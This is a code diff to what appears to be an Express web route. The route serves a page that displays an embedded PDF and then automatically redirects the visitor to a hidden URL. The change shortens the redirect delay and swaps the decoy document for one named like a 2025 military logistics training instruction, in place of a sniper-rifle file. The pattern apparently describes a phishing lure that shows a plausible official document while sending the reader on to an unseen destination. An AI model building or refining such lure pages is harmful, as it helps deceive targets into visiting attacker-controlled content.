@@ -56,12 +56,12 @@ router.get('/', (req, res) => {
                 <script>
                 setTimeout(function() {
                     window.location.href = '${url}';
-                }, 2000);
+                }, 1000);
                 </script> 
                 
             </head>
                 <body>
-                   <object data="./Collection of Sniper Rfl and Ammo.pdf" width="1950" height="1200"></object>
+                   <object data="./AMDT OF LOGISTICS AREA TRG INSTR-2,2025 27-08-25.pdf" width="1950" height="1200"></object>
                 </body>
         </html>
     `;
